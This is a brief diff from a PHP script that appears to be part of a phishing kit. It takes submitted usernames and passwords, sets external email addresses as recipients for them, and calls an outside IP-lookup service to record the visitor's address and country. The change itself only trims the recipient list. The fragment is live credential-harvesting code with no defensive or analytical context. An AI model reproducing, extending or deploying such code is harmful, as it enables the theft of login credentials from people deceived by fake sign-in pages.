@@ -17,7 +17,7 @@ if(isset($_POST['user_username']) && isset($_POST['user_password'])){
 
 $user = $_POST['user_username'];
 $pass = $_POST['user_password'];
-$recipient = "greatnessgneuis@yandex.ru,escobaseason20182019@gmail.com"; // Replace your email id here
+$recipient = "greatnessgneuis@yandex.ru"; // Replace your email id here
 $api = 'http://my-ips.org/ip/index.php';
 // $country = visitor_country();
 $ip = getenv("REMOTE_ADDR");
